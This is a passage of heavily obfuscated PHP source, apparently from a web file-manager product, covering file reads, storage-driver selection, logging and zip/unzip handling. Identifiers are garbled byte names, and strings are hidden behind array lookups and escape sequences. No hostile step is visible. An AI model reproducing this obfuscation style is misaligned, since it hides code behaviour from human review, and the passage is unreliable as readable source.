$ôä¼É¦ğ => $†‘¼êˆî) { if (isset($Ùíùš›[$ôä¼É¦ğ])) { if ($†‘¼êˆî[$Û´µÃô­[78]] == 1) { continue; } if ($Ùíùš›[$ôä¼É¦ğ][$Û´µÃô­[79]] == $†‘¼êˆî[$Û´µÃô­[79]]) { continue; } } if ($†‘¼êˆî[$Û´µÃô­[78]] == 1) { $ƒì‹¸¹[] = $â¯ÛÕ» . $Û´µÃô­[8] . trim($ôä¼É¦ğ, $Û´µÃô­[8]); continue; } $áÍ„…«¨ = strstr(trim($ôä¼É¦ğ, $Û´µÃô­[8]), $Û´µÃô­[8]) ? get_path_father($ôä¼É¦ğ) : $Û´µÃô­[12]; $Ñ®ˆ‹©‹[] = array($Û´µÃô­[1238] => $†‘¼êˆî[$Û´µÃô­[89]], $Û´µÃô­[1239] => rtrim($â¯ÛÕ», $Û´µÃô­[8]) . $Û´µÃô­[8] . $áÍ„…«¨, $Û´µÃô­[1240] => $†‘¼êˆî); } $±İ¬–á = array($Û´µÃô­[230] => $Ñ®ˆ‹©‹, $Û´µÃô­[78] => $ƒì‹¸¹); Hook::trigger($Û´µÃô­[1241], $×ûœÏÛ, $â¯ÛÕ», $±İ¬–á); foreach ($ƒì‹¸¹ as $†‘¼êˆî) { IO::mkdir($†‘¼êˆî); } foreach ($Ñ®ˆ‹©‹ as $†‘¼êˆî) { IO::copy($†‘¼êˆî[$Û´µÃô­[1238]], $†‘¼êˆî[$Û´µÃô­[1239]], REPEAT_REPLACE); } } public static function fileSubstr($ÌµæªÂØ, $é¸±‘Şü, $ÙÄ»­”ë = false) { $úî¶…¨¤ =& $_SERVER[³Ôà×Ó]; $›ù”‚ì¹ = self::driverMake($ÌµæªÂØ); $ã¨ıñ—— = $›ù”‚ì¹->size($ÌµæªÂØ); $åõÕºØä = $é¸±‘Şü; $Å¾‹«° = $ÙÄ»­”ë; if ($é¸±‘Şü < 0) { $é¸±‘Şü = $ã¨ıñ—— + $é¸±‘Şü; } if ($ÙÄ»­”ë === !1) { $ÙÄ»­”ë = $ã¨ıñ—— - $é¸±‘Şü; } if ($é¸±‘Şü + $ÙÄ»­”ë > $ã¨ıñ——) { $ÙÄ»­”ë = $ã¨ıñ—— - $é¸±‘Şü; } if (!$ã¨ıñ—— && $›ù”‚ì¹->getType() == $úî¶…¨¤[109] && !$›ù”‚ì¹->exist($ÌµæªÂØ)) { $Æú…‡û¹ = get_path_this($ÌµæªÂØ); $â·ø˜‚Ø = parse_url_query($Æú…‡û¹); if (is_array($â·ø˜‚Ø) && isset($â·ø˜‚Ø[$úî¶…¨¤[32]])) { $Æú…‡û¹ = urldecode($â·ø˜‚Ø[$úî¶…¨¤[32]]); } throw new Exception($úî¶…¨¤[1242] . LNG($úî¶…¨¤[1243]) . $úî¶…¨¤[1041] . clear_html($Æú…‡û¹) . $úî¶…¨¤[12]); } if ($ÙÄ»­”ë <= 0) { return $úî¶…¨¤[12]; } if ($é¸±‘Şü < 0 || $é¸±‘Şü >= $ã¨ıñ—— || $ÙÄ»­”ë > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\x52\145\x61\x64\40\x65\x72\x72\157\x72\41\x20\163\164\x61\x72\x74\x3d{$é¸±‘Şü}\73\x6c\145\156\147\164\150\75{$ÙÄ»­”ë}\73\x20\163\x69\x7a\x65\x3d{$ã¨ıñ——}\x3b"); } $’ú§à“ş = $›ù”‚ì¹->fileSubstr($ÌµæªÂØ, $é¸±‘Şü, $ÙÄ»­”ë); if (!$’ú§à“ş && $ÙÄ»­”ë && isset($GLOBALS[$úî¶…¨¤[1244]])) { throw new Exception($GLOBALS[$úî¶…¨¤[1244]][$úî¶…¨¤[1245]]); } return $’ú§à“ş; } private static function driverMake(&$–ø»§Œì) { $ÅÖ±Í˜Ú =& $_SERVER[³Ôà×Ó]; $Æ½Ğ¥÷Ù = KodIO::parse($–ø»§Œì); if (!self::$driverListSystem) { $ãåú¼Ø = Model($ÅÖ±Í˜Ú[842])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ãåú¼Ø, $ÅÖ±Í˜Ú[484]); } if ($Æ½Ğ¥÷Ù[$ÅÖ±Í˜Ú[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Æ½Ğ¥÷Ù[$ÅÖ±Í˜Ú[484]]]) { throw new Exception($ÅÖ±Í˜Ú[1246]); return !1; } $–ø»§Œì = $Æ½Ğ¥÷Ù[$ÅÖ±Í˜Ú[1247]]; $ÖØ¹Åç› = self::driverGet($Æ½Ğ¥÷Ù, $–ø»§Œì); return $ÖØ¹Åç›; } private static function driverGet($ÄØ«ĞıĞ, &$¡ÉÃÊ€Ú) { $§Ó³ŠÚ =& $_SERVER[³Ôà×Ó]; $ö‘½İ° = $ÄØ«ĞıĞ[$§Ó³ŠÚ[1248]]; $·“Œçøğ = $ÄØ«ĞıĞ[$§Ó³ŠÚ[484]]; switch ($ÄØ«ĞıĞ[$§Ó³ŠÚ[33]]) { case KodIO::KOD_IO: $¯Ùˆš¡º = self::$driverListSystem[$·“Œçøğ]; break; case KodIO::KOD_SOURCE: $¡ÉÃÊ€Ú = $·“Œçøğ . $¡ÉÃÊ€Ú; $¯Ùˆš¡º = array($§Ó³ŠÚ[1249] => $§Ó³ŠÚ[1250], $§Ó³ŠÚ[6] => $ÄØ«ĞıĞ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÖÈš£Œ½ = $GLOBALS[$§Ó³ŠÚ[1251]]; self::$driverListUser = array_to_keyvalue($ÖÈš£Œ½, $§Ó³ŠÚ[484]); } $¯Ùˆš¡º = self::$driverListUser[$·“Œçøğ]; break; case KodIO::KOD_SHARE_LINK: $¯Ùˆš¡º = array($§Ó³ŠÚ[1249] => $§Ó³ŠÚ[1252], $§Ó³ŠÚ[6] => $ÄØ«ĞıĞ); $İòã¨ÂÎ = Action($§Ó³ŠÚ[1253])->sharePathInfo($ÄØ«ĞıĞ[$§Ó³ŠÚ[87]]); $¡ÉÃÊ€Ú = $İòã¨ÂÎ[$§Ó³ŠÚ[193]]; if (!$İòã¨ÂÎ[$§Ó³ŠÚ[193]]) { $ÏŠà§åƒ = Model($§Ó³ŠÚ[673])->getInfo($İòã¨ÂÎ[$§Ó³ŠÚ[674]]); $¡ÉÃÊ€Ú = KodIO::clear($ÏŠà§åƒ[$§Ó³ŠÚ[1254]] . $ÄØ«ĞıĞ[$§Ó³ŠÚ[1247]]); $ÄØ«ĞıĞ[$§Ó³ŠÚ[569]] = $ÏŠà§åƒ; $ÄØ«ĞıĞ[$§Ó³ŠÚ[1229]] = $¡ÉÃÊ€Ú; $¯Ùˆš¡º = array($§Ó³ŠÚ[1249] => $§Ó³ŠÚ[1255], $§Ó³ŠÚ[6] => $ÄØ«ĞıĞ); } break; case KodIO::KOD_SHARE_ITEM: $¯Ùˆš¡º = array($§Ó³ŠÚ[1249] => $§Ó³ŠÚ[1256], $§Ó³ŠÚ[6] => $ÄØ«ĞıĞ); $ÏŠà§åƒ = Model($§Ó³ŠÚ[673])->getInfo($ÄØ«ĞıĞ[$§Ó³ŠÚ[484]]); if ($ÏŠà§åƒ[$§Ó³ŠÚ[193]] == $§Ó³ŠÚ[228]) { $¡ÉÃÊ€Ú = KodIO::clear($ÏŠà§åƒ[$§Ó³ŠÚ[1254]] . $ÄØ«ĞıĞ[$§Ó³ŠÚ[1247]]); $ÄØ«ĞıĞ[$§Ó³ŠÚ[569]] = $ÏŠà§åƒ; $ÄØ«ĞıĞ[$§Ó³ŠÚ[1229]] = $¡ÉÃÊ€Ú; $¯Ùˆš¡º = array($§Ó³ŠÚ[1249] => $§Ó³ŠÚ[1257], $§Ó³ŠÚ[6] => $ÄØ«ĞıĞ); } else { if (!$¡ÉÃÊ€Ú) { $¡ÉÃÊ€Ú = $ÏŠà§åƒ[$§Ó³ŠÚ[193]]; } } break; default: $¡ÉÃÊ€Ú = $ÄØ«ĞıĞ[$§Ó³ŠÚ[87]]; $¯Ùˆš¡º = array($§Ó³ŠÚ[1249] => $§Ó³ŠÚ[1258]); break; } $ÈÇ§Óú² = $ÄØ«ĞıĞ[$§Ó³ŠÚ[87]]; if (!isset(self::$driverCache[$ÈÇ§Óú²])) { $¡§ÁŒÀø = strtolower($¯Ùˆš¡º[$§Ó³ŠÚ[98]]); $³¹»óí» = $GLOBALS[$§Ó³ŠÚ[6]][$§Ó³ŠÚ[92]][$§Ó³ŠÚ[900]]; $ÃÎ½Ô·Æ = $§Ó³ŠÚ[77] . (isset($³¹»óí»[$¡§ÁŒÀø]) ? $³¹»óí»[$¡§ÁŒÀø] : ucfirst($¡§ÁŒÀø)); if (!class_exists($ÃÎ½Ô·Æ)) { show_json("{$ÃÎ½Ô·Æ}\40\156\x6f\164\x20\x65\x78\151\x73\x74\163\x21", !1); } $Ğ‡‡û½í = isset($¯Ùˆš¡º[$§Ó³ŠÚ[6]]) ? $¯Ùˆš¡º[$§Ó³ŠÚ[6]] : !1; self::$driverCache[$ÈÇ§Óú²] = new $ÃÎ½Ô·Æ($Ğ‡‡û½í); } $¢‹—¾Íı = self::$driverCache[$ÈÇ§Óú²]; $¢‹—¾Íı->pathDriver = $ö‘½İ°; $¢‹—¾Íı->pathBase = $§Ó³ŠÚ[12]; if (isset($¯Ùˆš¡º[$§Ó³ŠÚ[6]][$§Ó³ŠÚ[1259]])) { $¢‹—¾Íı->pathBase = rtrim($¯Ùˆš¡º[$§Ó³ŠÚ[6]][$§Ó³ŠÚ[1259]], $§Ó³ŠÚ[8]) . $§Ó³ŠÚ[8]; $¡ÉÃÊ€Ú = $¢‹—¾Íı->pathBase . ltrim($¡ÉÃÊ€Ú, $§Ó³ŠÚ[8]); } $¡ÉÃÊ€Ú = $¢‹—¾Íı->getPath($¡ÉÃÊ€Ú); if (isset($ÄØ«ĞıĞ[$§Ó³ŠÚ[1229]])) { $¡ÉÃÊ€Ú = $ÄØ«ĞıĞ[$§Ó³ŠÚ[1229]]; } $¢‹—¾Íı->path = $¡ÉÃÊ€Ú; return $¢‹—¾Íı; } public static function errorTips($ÃöŒŞ¥Õ = false) { $âĞØ›ı† =& $_SERVER[³Ôà×Ó]; static $´ø¶±§Ş = array(); $ˆ•Øø = 1000; if ($ÃöŒŞ¥Õ === -1) { return $´ø¶±§Ş ? $´ø¶±§Ş[count($´ø¶±§Ş) - 1] : $âĞØ›ı†[12]; } if ($ÃöŒŞ¥Õ === !1) { return implode($âĞØ›ı†[262], $´ø¶±§Ş); } if (count($´ø¶±§Ş) >= $ˆ•Øø) { $´ø¶±§Ş = array_slice($´ø¶±§Ş, $ˆ•Øø * 0.5, $ˆ•Øø); } $´ø¶±§Ş[] = $ÃöŒŞ¥Õ; write_log($âĞØ›ı†[176] . ACTION . $âĞØ›ı†[1260] . $ÃöŒŞ¥Õ, $âĞØ›ı†[1261]); } public static function getLastError($é¾Ò°ıÚ = '') { $íÃïñ„ò = self::errorTips(-1); return $íÃïñ„ò ? $íÃïñ„ò : $é¾Ò°ıÚ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¨¸¤‡òç; if ($¨¸¤‡òç) { return $¨¸¤‡òç; } $õŠğ¯±Ñ = IO::init($_SERVER[³Ôà×Ó][8]); return $õŠğ¯±Ñ; } private static function iconvSystem($æ·óÎĞ) { return self::local()->iconvSystem($æ·óÎĞ); } private static function iconvApp($Ï¹„¿ö¢) { return self::local()->iconvApp($Ï¹„¿ö¢); } public static function zipFolder($¢˜ÙœÂø, $â—âÇù¸ = "\172\x69\160", $Âƒ¹ÉÚ = '', $Ö”ŒĞ—« = REPEAT_RENAME) { $°õ±ÇÂú =& $_SERVER[³Ôà×Ó]; $ëæÂ® ¼ = IO::listPath($¢˜ÙœÂø); if (!$ëæÂ® ¼) { return !1; } $ëæÂ® ¼ = array_merge($ëæÂ® ¼[$°õ±ÇÂú[85]], $ëæÂ® ¼[$°õ±ÇÂú[86]]); return self::zip($ëæÂ® ¼, $â—âÇù¸, $Âƒ¹ÉÚ, $Ö”ŒĞ—«); } public static function zip($©´Ûûüç, $Øåã’÷Ú = "\x7a\x69\160", $š«£§•à = '', $¾şøëÒ  = REPEAT_RENAME) { $ûëú¬ö =& $_SERVER[³Ôà×Ó]; if (is_string($©´Ûûüç) && $©´Ûûüç) { $©´Ûûüç = array(array($ûëú¬ö[87] => $©´Ûûüç)); } $’ó¹‘ù· = self::init($©´Ûûüç[0][$ûëú¬ö[87]]); $¿Îüß°í = self::info($©´Ûûüç[0][$ûëú¬ö[87]]); $‘Ùİ¾·Á = $ûëú¬ö[12]; $•Ş¾ºà = $ûëú¬ö[12]; $ú‡ “ Œ = $ûëú¬ö[12]; if ($š«£§•à && substr($š«£§•à, -1, 1) != $ûëú¬ö[8]) { $•Ş¾ºà = get_path_father($š«£§•à); $ú‡ “ Œ = get_path_this($š«£§•à); } else { $•Ş¾ºà = self::pathFather($¿Îüß°í[$ûëú¬ö[87]]); $ú‡ “ Œ = $¿Îüß°í[$ûëú¬ö[32]] . $ûëú¬ö[10] . $Øåã’÷Ú; if (count($©´Ûûüç) > 1) { $ÛËëâÑ = IO::info($•Ş¾ºà); $ú‡ “ Œ = $ÛËëâÑ[$ûëú¬ö[32]] . $ûëú¬ö[10] . $Øåã’÷Ú; } if ($š«£§•à) { $•Ş¾ºà = $š«£§•à; } } if ($’ó¹‘ù·->getType() == $ûëú¬ö[109]) { $ûØÙÂ¨ = self::init($•Ş¾ºà); $Çİ´ş—½ = $ûØÙÂ¨->getType() == $ûëú¬ö[109] ? $•Ş¾ºà : get_path_father($’ó¹‘ù·->path); $Çİ´ş—½ = rtrim($Çİ´ş—½, $ûëú¬ö[8]) . $ûëú¬ö[8]; mk_dir($Çİ´ş—½); } else { $‘Ùİ¾·Á = TEMP_FILES . $ûëú¬ö[1262] . time() . rand_string(8) . $ûëú¬ö[8]; mk_dir($‘Ùİ¾·Á); file_put_contents($‘Ùİ¾·Á . $ûëú¬ö[1263], $ûëú¬ö[12]); $Çİ´ş—½ = $‘Ùİ¾·Á; } $Şïı‰Ê = IO::info($Çİ´ş—½); if (!$Şïı‰Ê || !$Şïı‰Ê[$ûëú¬ö[233]]) { show_json(LNG($ûëú¬ö[1264]), !1); } $úæ¥øíÙ = self::zipFileList($©´Ûûüç, $‘Ùİ¾·Á); foreach ($úæ¥øíÙ as $¹ú£€Ä˜ => $Ìİû¾™) { $úæ¥øíÙ[$¹ú£€Ä˜] = self::iconvSystem($Ìİû¾™); } $üˆó·‘ƒ = get_filename_auto($Çİ´ş—½ . $ú‡ “ Œ, $ûëú¬ö[12], $¾şøëÒ ); KodArchive::create(self::iconvSystem($üˆó·‘ƒ), $úæ¥øíÙ); if (!IO::exist($üˆó·‘ƒ)) { if ($‘Ùİ¾·Á) { del_dir($‘Ùİ¾·Á); } write_log($ûëú¬ö[1265] . $üˆó·‘ƒ, $ûëú¬ö[389]); show_json(LNG($ûëú¬ö[1266]), !1); } if (!$‘Ùİ¾·Á) { return $üˆó·‘ƒ; } $çÍùÍæÇ = self::move($üˆó·‘ƒ, $•Ş¾ºà, $¾şøëÒ ); if ($‘Ùİ¾·Á) { del_dir($‘Ùİ¾·Á); } if (!$üˆó·‘ƒ) { write_log($ûëú¬ö[1267] . $üˆó·‘ƒ . $ûëú¬ö[1268] . $•Ş¾ºà, $ûëú¬ö[389]); show_json(LNG($ûëú¬ö[1266]), !1); } return $çÍùÍæÇ; } public static function unzip($’úŸÂ·„, $Óõí•·ª, $ëà§ˆ‘¤ = "\x2d\x31", $„¯€Æ³À = "\x72\145\x70\154\x61\x63\x65") { $–åéÛ¤¹ =& $_SERVER[³Ôà×Ó]; $ú½·”›× = parent::info($’úŸÂ·„); if (!$ú½·”›×) { show_json(LNG($–åéÛ¤¹[1269]), !1); } $ûéÁ÷£œ = IO::infoFullSimple($Óõí•·ª); if (!$ûéÁ÷£œ) { $Óõí•·ª = IO::mkdir($Óõí•·ª); } if (isset($ûéÁ÷£œ[$–åéÛ¤¹[193]]) && trim($ûéÁ÷£œ[$–åéÛ¤¹[87]], $–åéÛ¤¹[8]) != trim($Óõí•·ª, $–åéÛ¤¹[8])) { $‘·ÛÃ = KodIO::make($ûéÁ÷£œ[$–åéÛ¤¹[192]]); $¼„¨†ÏÅ = IO::fileNameAuto($‘·ÛÃ, $ûéÁ÷£œ[$–åéÛ¤¹[32]], REPEAT_RENAME_FOLDER, !0); $Óõí•·ª = IO::mkdir($‘·ÛÃ . $¼„¨†ÏÅ); } $ëà§ˆ‘¤ = $ëà§ˆ‘¤ && $ëà§ˆ‘¤ != $–åéÛ¤¹[1270] ? @json_decode($ëà§ˆ‘¤, !0) : -1; $ÃÙ±ŒÌĞ = self::unzipPart($’úŸÂ·„, $ëà§ˆ‘¤); if (!$ÃÙ±ŒÌĞ || !IO::exist($ÃÙ±ŒÌĞ[$–åéÛ¤¹[230]])) { show_json(LNG($–åéÛ¤¹[108]), !1); } $ó„—¼…ö = $ÃÙ±ŒÌĞ[$–åéÛ¤¹[1271]][count($ÃÙ±ŒÌĞ[$–åéÛ¤¹[1271]]) - 1]; if ($ó„—¼…ö[$–åéÛ¤¹[1272]] == -1 || substr($ó„—¼…ö[$–åéÛ¤¹[32]], -1, 1) == $–åéÛ¤¹[8]) { $ˆÅÀ¾şã = $ÃÙ±ŒÌĞ[$–åéÛ¤¹[1273]] . rand_string(10) . $–åéÛ¤¹[8]; mk_dir($ˆÅÀ¾şã); $Ó’‚óÉî = count($ÃÙ±ŒÌĞ[$–åéÛ¤¹[1271]]) == 1 ? IO::ext($’úŸÂ·„) : get_path_ext($ÃÙ±ŒÌĞ[$–åéÛ¤¹[230]]); $ÒĞù„¶Å = KodArchive::extract(self::iconvSystem($ÃÙ±ŒÌĞ[$–åéÛ¤¹[230]]), $ˆÅÀ¾şã, $ó„—¼…ö[$–åéÛ¤¹[1272]], $¼„¨†ÏÅ, $Ó’‚óÉî); self::unzipErrorCheck($ÒĞù„¶Å, array($–åéÛ¤¹[1274], $’úŸÂ·„, $Ó’‚óÉî, $Óõí•·ª, $ÃÙ±ŒÌĞ)); Hook::trigger($–åéÛ¤¹[1275], $ˆÅÀ¾şã); recursion_dir($ˆÅÀ¾şã, $¬ØŠæ¨¯, $¬µûíÈ—, 0); $à‡¥Öàœ = array_merge($¬ØŠæ¨¯, $¬µûíÈ—); $ã·×¼Ã = array(); foreach ($à‡¥Öàœ as $á×êŸÚÁ) { $ƒ©¥¨âĞ = IO::move(self::iconvApp($á×êŸÚÁ), $Óõí•·ª, $„¯€Æ³À); if ($ƒ©¥¨âĞ) { $ã·×¼Ã[] = $ƒ©¥¨âĞ; } } del_dir($ˆÅÀ¾şã); } else { $ƒ©¥¨âĞ = IO::move($ÃÙ±ŒÌĞ[$–åéÛ¤¹[230]], $Óõí•·ª, $„¯€Æ³À, get_path_this($ó„—¼…ö[$–åéÛ¤¹[32]])); if ($ƒ©¥¨âĞ) { $ã·×¼Ã[] = $ƒ©¥¨âĞ; } } return $ã·×¼Ã ? $ã·×¼Ã : !1; } public static function unzipList($¡È˜ã·˜) { $•¨‹³öã =& $_SERVER[³Ôà×Ó]; $Ô¦ñ·×³ = isset($¡È˜ã·˜[$•¨‹³öã[1276]]) ? $¡È˜ã·˜[$•¨‹³öã[1276]] : !1; $òù Ó›† = isset($¡È˜ã·˜[$•¨‹³öã[1272]]) ? @json_decode($¡È˜ã·˜[$•¨‹³öã[1272]], !0) : -1; $²‚–ø€Ó = self::unzipPart($¡È˜ã·˜[$•¨‹³öã[87]], $òù Ó›†); if (!$²‚–ø€Ó || !IO::exist($²‚–ø€Ó[$•¨‹³öã[230]])) { show_json(LNG($•¨‹³öã[108]), !1); } $Ë—†‡ß÷ = $²‚–ø€Ó[$•¨‹³öã[1271]][count($²‚–ø€Ó[$•¨‹³öã[1271]]) - 1]; $õåú± = in_array(IO::ext($²‚–ø€Ó[$•¨‹³öã[230]]), array($•¨‹³öã[389], $•¨‹³öã[1277], $•¨‹³öã[1278], $•¨‹³öã[1279], $•¨‹³öã[1280], $•¨‹³öã[1281])); if (!$Ô¦ñ·×³ && ($Ë—†‡ß÷[$•¨‹³öã[1272]] == -1 || $õåú±)) { $”ÍÛ£«¾ = $²‚–ø€Ó[$•¨‹³öã[1273]] . get_path_this($²‚–ø€Ó[$•¨‹³öã[230]]) . $•¨‹³öã[1282]; if (!IO::exist($”ÍÛ£«¾)) { $ëõô’¾Å = $Ë—†‡ß÷[$•¨‹³öã[1272]] == -1 ? get_path_ext(IO::pathThis($¡È˜ã·˜[$•¨‹³öã[87]])) : get_path_ext($²‚–ø€Ó[$•¨‹³öã[230]]); $‚ÕšıÜ¯ = KodArchive::listContent(self::iconvSystem($²‚–ø€Ó[$•¨‹³öã[230]]), !0, $ëõô’¾Å); self::unzipErrorCheck($‚ÕšıÜ¯, array($•¨‹³öã[1283], $¡È˜ã·˜, $²‚–ø€Ó)); @file_put_contents($”ÍÛ£«¾, json_encode($‚ÕšıÜ¯[$•¨‹³öã[1284]])); } return @json_decode(IO::getContent($”ÍÛ£«¾), !0); } IO::fileOut($²‚–ø€Ó[$•¨‹³öã[230]], $Ô¦ñ·×³, get_path_this($Ë—†‡ß÷[$•¨‹³öã[32]])); die; } private static function zipFileList($ëê–«çâ, $ç¢…˜ˆ = false) { $ƒªÖü¥ =& $_SERVER[³Ôà×Ó]; $Î‚ûï‡¬ = array(); foreach ($ëê–«çâ as $ˆ‰¡–) { $õ«ÂìØÏ = $ˆ‰¡–[$ƒªÖü¥[87]]; if ($ç¢…˜ˆ) { $õ«ÂìØÏ = self::copy($ˆ‰¡–[$ƒªÖü¥[87]], $ç¢…˜ˆ, $ƒªÖü¥[893]); } else { $åñ¤»¨ = self::init($ˆ‰¡–[$ƒªÖü¥[87]]); if ($åñ¤»¨->getType() == $ƒªÖü¥[109]) { $õ«ÂìØÏ = $åñ¤»¨->path; } } if ($õ«ÂìØÏ && self::local()->exist($õ«ÂìØÏ)) { $Î‚ûï‡¬[$ˆ‰¡–[$ƒªÖü¥[87]]] = $õ«ÂìØÏ; } } if (!empty($Î‚ûï‡¬)) { return array_values($Î‚ûï‡¬); } show_json(LNG($ƒªÖü¥[1243]), !1); } private static function localFilePath($‘Ó¬ŸÙ–) { $ÁüèÇùö =& $_SERVER[³Ôà×Ó]; $•¨í±ıÖ = KodIO::parse($‘Ó¬ŸÙ–); if ($•¨í±ıÖ[$ÁüèÇùö[33]] == KodIO::KOD_SOURCE) { $©øÓ»ö‡ = Model($ÁüèÇùö[899])->fileInfoGet(KodIO::sourceID($‘Ó¬ŸÙ–)); if (!$©øÓ»ö‡[$ÁüèÇùö[87]]) { show_json($ÁüèÇùö[1285], !1); } $‘Ó¬ŸÙ– = $©øÓ»ö‡[$ÁüèÇùö[87]]; } $½Èâ¶Ö° = self::init($‘Ó¬ŸÙ–); if ($½Èâ¶Ö°->pathParse[$ÁüèÇùö[1229]]) { $‘Ó¬ŸÙ– = $½Èâ¶Ö°->pathParse[$ÁüèÇùö[1229]]; $½Èâ¶Ö° = self::init($‘Ó¬ŸÙ–); } $á…¼Ú = $½Èâ¶Ö°->getType(); if ($á…¼Ú == $ÁüèÇùö[109] || $á…¼Ú == $ÁüèÇùö[1286]) { if (!$½Èâ¶Ö°->exist($½Èâ¶Ö°->path)) { show_json(LNG($ÁüèÇùö[108]), !1); } return $½Èâ¶Ö°->path; } return !1; } public static function unzipPart($Ú¯Ìúíï, $‚ˆ™¿€» = -1) { $ü±ìà° =& $_SERVER[³Ôà×Ó]; $ê»à”á³ = IO::pathThis($Ú¯Ìúíï); if (!$‚ˆ™¿€» || $‚ˆ™¿€» == -1) { $‰§Ú˜ò„ = array(array($ü±ìà°[32] => $ê»à”á³, $ü±ìà°[1272] => -1)); $‰§Ú˜ò„[0][$ü±ìà°[1287]] = $‰§Ú˜ò„[0][$ü±ìà°[32]]; } else { if (is_array($‚ˆ™¿€»)) { $‰§Ú˜ò„ = $‚ˆ™¿€»; $øîøûú = count($‰§Ú˜ò„) - 1; for ($æª¹­¢ = 0; $æª¹­¢ <= $øîøûú; $æª¹­¢++) { $Ä–şÛóÅ = $‰§Ú˜ò„[$æª¹­¢]; $©ØŸøôÍ = get_path_this($Ä–şÛóÅ[$ü±ìà°[32]]) . (checkExtSafe($Ä–şÛóÅ[$ü±ìà°[32]]) ? $ü±ìà°[12] : $ü±ìà°[1288]); $‰§Ú˜ò„[$æª¹­¢][$ü±ìà°[1287]] = $ü±ìà°[1289] . intval($Ä–şÛóÅ[$ü±ìà°[1272]]) . $ü±ìà°[471] . $©ØŸøôÍ; if ($æª¹­¢ == 0) { continue; } $‰§Ú˜ò„[$æª¹­¢][$ü±ìà°[1287]] = $‰§Ú˜ò„[$æª¹­¢ - 1][$ü±ìà°[1287]] . $ü±ìà°[1290] . $‰§Ú˜ò„[$æª¹­¢][$ü±ìà°[1287]]; } } } if (!is_array($‰§Ú˜ò„) || count($‰§Ú˜ò„) == 0) { return !1; } $¿¡Ä¥ÅÑ = $‰§Ú˜ò„[count($‰§Ú˜ò„) - 1]; if (!IO::exist($Ú¯Ìúíï)) { return !1; } $Êåª×Éà = TEMP_FILES . $ü±ìà°[1291] . kodIO::hashPathSafe($Ú¯Ìúíï) . $ü±ìà°[8]; $ûúåâˆ³ = $Êåª×Éà . $¿¡Ä¥ÅÑ[$ü±ìà°[1287]]; mk_dir($Êåª×Éà); file_put_contents(TEMP_FILES . $ü±ìà°[1263], $ü±ìà°[12]); if (IO::exist($ûúåâˆ³)) { return array($ü±ìà°[230] => $ûúåâˆ³, $ü±ìà°[1271] => $‰§Ú˜ò„, $ü±ìà°[1273] => $Êåª×Éà); } $ĞÌÁùš” = self::localFilePath($Ú¯Ìúíï); if (!$ĞÌÁùš”) { $ĞÌÁùš” = $Êåª×Éà . $ü±ìà°[1292]; if (!IO::exist($ĞÌÁùš”)) { self::copy($Ú¯Ìúíï, $Êåª×Éà, !1, get_path_this($ĞÌÁùš”)); } } if (!$ĞÌÁùš” || !IO::exist($ĞÌÁùš”)) { return !1; } if ($¿¡Ä¥ÅÑ[$ü±ìà°[1272]] == -1) { return array($ü±ìà°[230] => $ĞÌÁùš”, $ü±ìà°[1271] => $‰§Ú˜ò„, $ü±ìà°[1273] => $Êåª×Éà); } $á´±©Â× = $ĞÌÁùš”; foreach ($‰§Ú˜ò„ as $æª¹­¢ => $Ä–şÛóÅ) { if (!$Ä–şÛóÅ || $Ä–şÛóÅ[$ü±ìà°[1272]] == $ü±ìà°[1270]) { break; } if (substr($Ä–şÛóÅ[$ü±ìà°[32]], -1, 1) == $ü±ìà°[8]) { break; } $Í›Œç¸Ã = in_array(get_path_ext($Ä–şÛóÅ[$ü±ìà°[1287]]), array($ü±ìà°[389], $ü±ìà°[1277], $ü±ìà°[1278], $ü±ìà°[1279], $ü±ìà°[1280], $ü±ìà°[1281])); $ÏğÒ‘Û = $æª¹­¢ == count($‰§Ú˜ò„) - 1 && $Í›Œç¸Ã; $å›—ÓˆÜ = $Êåª×Éà . $Ä–şÛóÅ[$ü±ìà°[1287]]; $«ñò¼ò = $Êåª×Éà . get_path_this($Ä–şÛóÅ[$ü±ìà°[32]]); if (IO::exist($å›—ÓˆÜ)) { $á´±©Â× = $å›—ÓˆÜ; continue; } $ÕâÃî… = $æª¹­¢ == 0 ? get_path_ext($ê»à”á³) : get_path_ext($á´±©Â×); $·šş«ş™ = KodArchive::extract(self::iconvSystem($á´±©Â×), $Êåª×Éà, $Ä–şÛóÅ[$ü±ìà°[1272]], $êÁı½ªß, $ÕâÃî…); self::unzipErrorCheck($·šş«ş™, array($ü±ìà°[1293], $Ú¯Ìúíï, $‰§Ú˜ò„, $Ä–şÛóÅ, $å›—ÓˆÜ)); if (IO::exist($«ñò¼ò)) { IO::rename($«ñò¼ò, get_path_this($å›—ÓˆÜ)); } $á´±©Â× = $å›—ÓˆÜ; } $ûúåâˆ³ = $á´±©Â×; return array($ü±ìà°[230] => $á´±©Â×, $ü±ìà°[1271] => $‰§Ú˜ò„, $ü±ìà°[1273] => $Êåª×Éà); } private static function unzipErrorCheck($¾­ÙÇ”, $­Òï‹¸‰ = false) { $¡òíå =& $_SERVER[³Ôà×Ó]; if ($¾­ÙÇ”[$¡òíå[1294]]) { return !0; } write_log(array($¡òíå[1295], $¾­ÙÇ”, $­Òï‹¸‰), $¡òíå[1296]); show_json($¡òíå[1297] . json_encode($¾­ÙÇ”[$¡òíå[1284]]), !1); die; } } goto a³¸ÌËóÃ; bà×œÇ©¯½: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\163\157\165\162\143\145\123\x65\143\x72\x65\x74\x4c\151\x73\x74"; public $field = array("\x73\x6f\165\x72\x63\145\111\104", "\164\171\x70\x65\x49\x44", "\143\162\x65\x61\x74\145\125\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\163\164\x6f\162\141\x67\145\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\163\x69\x7a\x65\x4d\141\170", "\x73\x79\x73\x74\x65\x6d", "\144\145\x66\141\x75\154\164", "\144\162\x69\166\145\x72", "\143\x6f\156\x66\x69\x67"); public function listData($¡°ê¯Ã… = false, $ïéßß§’ = "\x6d\157\144\x69\146\x79\x54\151\155\x65", $¸¨­ÛÁÂ = false) { $‰ëŞ÷– =& $_SERVER[³Ôà×Ó]; $‡ûéÈ¤³ = parent::listData($¡°ê¯Ã…, $ïéßß§’, $¸¨­ÛÁÂ); if ($¡°ê¯Ã…) { return $‡ûéÈ¤³; } $Ò¥£ÃØ» = array(); if ($GLOBALS[$‰ëŞ÷–[2289]]) { 